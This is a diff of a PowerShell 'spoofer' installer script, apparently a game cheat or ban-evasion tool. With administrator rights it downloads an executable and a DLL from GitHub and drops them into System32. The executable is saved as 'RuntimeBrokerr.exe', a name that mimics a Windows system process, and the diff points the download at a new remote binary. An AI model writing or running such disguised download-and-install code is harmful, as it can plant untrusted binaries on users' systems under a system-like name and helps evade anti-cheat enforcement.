@@ -1,7 +1,7 @@
 # -----------------------------
 # Menu Selection
 # -----------------------------
-Write-Host "Hi Member Seanual X Spoofer Welcome to TitanX:"
+Write-Host "Hi Member Seanual X Spoofer Welcome to TitanX UPDATE | 18/10/2025:"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
@@ -22,7 +22,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokerr.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
-$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/web1/raw/refs/heads/main/loder.exe"
+$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/roblox/raw/refs/heads/main/heanual.exe"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -96,4 +96,5 @@ elseif ($choice -eq "2") {
 
 else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+
 }
